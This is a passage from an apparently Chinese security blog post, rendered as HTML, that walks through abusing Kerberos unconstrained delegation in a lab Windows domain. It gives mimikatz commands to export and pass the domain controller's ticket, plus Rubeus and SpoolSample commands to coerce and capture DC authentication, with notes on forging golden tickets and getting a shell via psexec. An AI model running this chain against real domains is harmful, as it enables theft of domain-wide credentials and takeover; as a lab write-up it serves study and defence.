-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232506026.png" class title="image-20220315232506026">
-
-
-
-<p>若域内存在非约束委派机器，那么就可以使用域内我们想要获得票据的用户来登陆此非约束委派主机，从而在非约束委派主机中留下期望获得的主机票据的缓存</p>
-<p>这里先在域控主机（DC）上通过winrm连接域内的非委派主机（PC2）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enter-PSSession -ComputerName PC2</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232601340.png" class title="image-20220315232601340">
-
-<p>可以看到这里是成功连上了PC2，并且是administrator权限</p>
-<p>在ptt之前，是无法访问域控的</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232851871.png" class title="image-20220315232851871">
-
-
-
-<p>利用猕猴桃将域控的tgt导出来，因为域控连接过pc2，因此会有域控的tgt缓存</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge </span><br><span class="line">sekurlsa::tickets /exports</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316000914827.png" class title="image-20220316000914827">
-
-
-
-<p>进行ptt（票据传递），生成tgt票据（<strong>这里获得的票据不能算作黄金票据，我们获得的权限只是域控的本地管理权限，不能连接域控，黄金票据的条件是缺一不可的，但是我们可以获取所有用户的hash，制作真正的黄金票据</strong>）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt [0;291f51]-2-0-60a10000-Administrator@krbtgt-WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316000954582.png" class title="image-20220316000954582">
-
-
-
-<p>成功生成票据，接下来制作黄金票据的过程就不赘述了</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316001115188.png" class title="image-20220316001115188">
-
-
-
-
-
-<p>除了直接在域控使用winrm，还可以利用<strong>非约束委派+spooler打印机服务</strong>强制指定的主机进行连接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rubeus.exe monitor /interval:1 filteruser:DC$ &gt; c:\users\hash.txt</span><br></pre></td></tr></table></figure>
-
-<p>使用rubues来监听本机连接的情况，设置监听间隔为一秒，监控对象为域控的主机名</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172630642.png" class title="image-20220316172630642">
-
-
-
-<p>运行spoolsample利用打印服务，强制让域控DC向域成员PC2验证身份，因为设置了rubeus监听，所以可以抓到TGS</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spoolsample.exe DC PC2</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172651602.png" class title="image-20220316172651602">
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172722495.png" class title="image-20220316172722495">
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172913745.png" class title="image-20220316172913745">
-
-<p>这里报错了，但是的确rubeus抓到了base64加密的tgt(hash.txt)</p>
-<p>这里用powershell解密base64，其他方法也可以，但是powershell可以直接将tgt文件保存下来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[IO.File]::WriteAllBytes(&quot;c:\users\moretz.whoamianony\tgt.kirbi&quot;, [Convert]::FromBase64String(&quot;得到的base64&quot;))</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316174513722.png" class title="image-20220316174513722">
-
-
-
-<p>使用mimikatz导入票据后，跟之前一样也是个有域控本地管理员权限的，用mimikatz制作黄金票据后可以用psexec.exe反弹shell，不需要账号密码。（lsadump）</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316174621620.png" class title="image-20220316174621620">
 ]]></content>
       <categories>
         <category>内网</category>
